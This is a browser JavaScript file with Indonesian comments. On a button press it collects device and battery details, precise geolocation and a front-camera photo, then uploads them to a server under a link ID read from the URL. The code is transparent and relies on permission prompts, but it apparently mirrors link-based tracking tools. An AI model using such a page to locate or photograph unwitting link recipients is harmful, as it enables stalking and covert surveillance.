// --- Elemen UI ---
const startButton = document.getElementById('startButton');
const statusList = document.getElementById('status-list');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// --- Fungsi Bantuan ---
const getLinkId = () => {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('id');
};

const updateStatus = (message, isError = false) => {
    const li = document.createElement('li');
    li.textContent = message;
    if (isError) {
        li.className = 'error';
    }
    statusList.appendChild(li);
    // Auto-scroll to the bottom
    statusList.scrollTop = statusList.scrollHeight;
};

// --- Fungsi Pengumpul Data ---

const getDeviceInfo = () => {
    updateStatus('1. Mengambil info perangkat...');
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform || 'N/A',
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
    };

    if (navigator.getBattery) {
        return navigator.getBattery().then(battery => {
            data.battery = {
                level: Math.round(battery.level * 100) + "%",
                isCharging: battery.charging
            };
            return data;
        });
    } else {
        data.battery = { level: 'N/A', isCharging: 'N/A' };
        return Promise.resolve(data);
    }
};

const getLocation = () => {
    updateStatus('2. Mengambil lokasi...');
    if (!navigator.geolocation) {
        throw new Error('Geolocation tidak didukung oleh browser ini.');
    }
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            position => resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
            }),
            error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
};

const getPhoto = async () => {
    updateStatus('3. Mengambil foto...');
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error('API Kamera (getUserMedia) tidak didukung oleh browser ini.');
    }

    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
    });
    videoEl.srcObject = stream;
    await new Promise(resolve => videoEl.onloadedmetadata = resolve);
    videoEl.play();
    
    // Tunggu kamera siap
    await new Promise(resolve => setTimeout(resolve, 500));

    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    const context = canvasEl.getContext('2d');
    context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    
    const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
    
    // Matikan stream kamera
    stream.getTracks().forEach(track => track.stop());
    videoEl.srcObject = null;
    
    return photoBase64;
};

const sendDataToServer = async (linkId, data) => {
    updateStatus('4. Mengirim data ke server...');
    const response = await fetch('/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ link_id: linkId, data: data })
    });

    if (!response.ok) {
        const errorResult = await response.json();
        throw new Error(`Server merespon dengan error: ${errorResult.message || response.statusText}`);
    }
    return response.json();
};


// --- Event Listener Utama ---
startButton.addEventListener('click', async () => {
    startButton.disabled = true;
    statusList.innerHTML = ''; // Bersihkan status sebelumnya
    updateStatus('Memulai proses...');

    const linkId = getLinkId();
    if (!linkId) {
        updateStatus('Error: Link ID tidak ditemukan di URL.', true);
        startButton.disabled = false;
        return;
    }
    
    const allData = {};

    try {
        // Langkah 1: Info Perangkat
        allData.deviceInfo = await getDeviceInfo();
        updateStatus('✅ Info perangkat OK');
        
        // Langkah 2: Lokasi
        allData.location = await getLocation();
        updateStatus('✅ Lokasi OK');
        
        // Langkah 3: Foto
        allData.photoBase64 = await getPhoto();
        updateStatus('✅ Foto OK');
        
        // Langkah 4: Kirim
        await sendDataToServer(linkId, allData);
        updateStatus('✅ Semua data berhasil terkirim!');
        updateStatus('Terima kasih! Anda bisa menutup halaman ini.');

    } catch (error) {
        console.error("Proses gagal:", error);
        updateStatus(`❌ GAGAL: ${error.message}`, true);
        startButton.disabled = false; // Izinkan coba lagi
    }
});
